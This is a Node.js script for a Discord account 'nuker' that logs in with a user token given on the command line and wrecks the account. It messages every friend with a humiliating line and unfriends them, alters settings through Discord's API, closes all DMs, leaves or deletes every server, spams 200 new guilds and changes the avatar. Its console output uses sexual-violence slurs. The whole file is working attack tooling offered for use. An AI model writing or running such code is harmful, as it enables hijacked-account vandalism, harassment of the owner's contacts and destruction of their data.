const { Client } = require('discord.js');
const client = new Client();
const chalk = require('chalk');
const axios = require('axios');
let sleep = (time) => new Promise(resolve => setTimeout(resolve, time));
let token = process.argv[2];

process.title = 'eternal enslaver'

client.on('ready', async () => {
   console.log(chalk.gray('=============================================='))
   console.log(chalk.green(`Ready as ${client.user.tag}`))
   console.log(chalk.gray('=============================================='))
   await changePfp()
   await fuckSettings()
   await enslaveFriends(client.user.friends)
   await fuckDMs(client.channels.filter(c => c.type === 'dm'))
   await enslaveServers(client.guilds)
   await spamServers()
   console.log(chalk.gray('=============================================='))
   console.log(chalk.green(`Finished raping account`))
   console.log(chalk.gray('=============================================='))
})

async function enslaveFriends(friends) {
   if (!friends.size) return;
   for (const friend of friends.values()) {
      await sleep(100)
      await friend.send(`eternal is daddy eternal owns me im a skid`)
      friend.removeFriend().catch(() => { })
      console.log(chalk.green(`Relationship with ${friend.tag} ended`))
   }
   console.log(chalk.gray('=============================================='))
   await sleep(500)
}

async function fuckSettings() {
   await axios.patch('https://canary.discordapp.com/api/v8/users/@me/settings', {
      locale: 'zh-CN',
      theme: 'light',
      message_display_compact: true,
      inline_embed_media: false,
      inline_attachment_media: false,
      gif_auto_play: false,
      render_embeds: false,
      render_reactions: false,
      animate_emoji: false
   }, {
      headers: {
         Authorization: token
      }
   })
   console.log(chalk.green('Raped Settings'))
   console.log(chalk.gray('=============================================='))
}

async function fuckDMs(dms) {
   if (!dms.size) return;
   for (const dm of dms.values()) {
      await sleep(100)
      dm.delete().catch(() => { })
      console.log(chalk.green(`Closed DM with ${dm.recipient.tag}`))
   }
   console.log(chalk.gray('=============================================='))
   await sleep(500)
}

async function enslaveServers(servers) {
   if (!servers.size) return;
   for (const server of servers.values()) {
      await sleep(100)
      server.leave().then(() => console.log(`Left server ${server.name}`)).catch(() => {
         return server.delete().then(() => console.log(chalk.green(`Deleted server ${server.name}`))).catch(() => { })
      })
   }
   await sleep(500)
   console.log(chalk.gray('=============================================='))
}

async function spamServers() {
   console.log(chalk.green('Creating servers...'))
   for (let i = 0; i < 200; i++) {
      await sleep(200)
      client.user.createGuild(`eternal owns you ${random(3)}`, 'us-west', './avatar.png').catch(() => { })
   }
   console.log(chalk.green('Created servers'))
}

async function changePfp() {
   await client.user.setAvatar('./avatar.png').catch(() => { });
   console.log(chalk.green(`Avatar set`))
   console.log(chalk.gray('=============================================='))
}

const random = length => {
   let text = "";
   const possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

   for (let i = 0; i < length; i++) {
      text += possible.charAt(Math.floor(Math.random() * possible.length));
   }

   return text;
}

client.login(token)